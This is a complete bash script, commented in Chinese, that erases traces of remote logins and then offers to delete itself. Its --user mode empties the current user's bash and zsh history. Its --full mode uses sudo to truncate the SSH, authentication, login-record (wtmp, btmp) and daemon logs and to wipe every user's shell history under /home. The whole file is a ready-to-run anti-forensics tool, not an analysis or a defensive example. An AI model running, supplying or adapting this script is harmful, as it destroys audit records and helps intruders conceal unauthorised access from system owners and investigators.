#!/bin/bash

# 脚本说明：清理用户或系统远程登录痕迹，并支持运行后删除自身
# 使用方式：
#   ./clean_trace.sh --user     # 只清理当前用户记录
#   ./clean_trace.sh --full     # 清理全系统痕迹（需 sudo）
# 脚本结束后会询问是否删除自身

# 颜色输出
info() { echo -e "\e[32m[INFO]\e[0m $1"; }
warn() { echo -e "\e[33m[WARN]\e[0m $1"; }
error() { echo -e "\e[31m[ERROR]\e[0m $1"; }

# 清理当前用户历史
clean_user_history() {
    info "清理当前用户 bash 和 zsh 历史记录..."
    > ~/.bash_history 2>/dev/null
    > ~/.zsh_history 2>/dev/null
    history -c 2>/dev/null
    info "已清理当前用户历史记录"
}

# 清理全系统记录
clean_system_logs() {
    info "清理 SSH 登录日志..."
    sudo truncate -s 0 /var/log/auth.log 2>/dev/null
    sudo truncate -s 0 /var/log/secure 2>/dev/null
    sudo truncate -s 0 /var/log/wtmp 2>/dev/null
    sudo truncate -s 0 /var/log/btmp 2>/dev/null

    info "清理 SFTP 日志..."
    sudo truncate -s 0 /var/log/daemon.log 2>/dev/null

    info "清理所有用户 bash/zsh 历史..."
    sudo find /home -type f \( -name ".bash_history" -o -name ".zsh_history" \) -exec truncate -s 0 {} \; 2>/dev/null

    info "系统记录清理完成"
}

# 交互式删除脚本自身
ask_self_delete() {
    read -p "是否删除该脚本自身？[y/N]: " choice
    case "$choice" in
        [yY][eE][sS]|[yY])
            rm -- "$0"
            info "脚本已删除"
            ;;
        *)
            info "脚本保留"
            ;;
    esac
}

# 参数处理
case "$1" in
    --user)
        info "执行模式：只清理当前用户历史"
        clean_user_history
        ;;
    --full)
        info "执行模式：清理全系统登录/操作记录"
        clean_user_history
        clean_system_logs
        ;;
    *)
        echo "用法: $0 [--user | --full]"
        exit 1
        ;;
esac

# 是否删除脚本
ask_self_delete

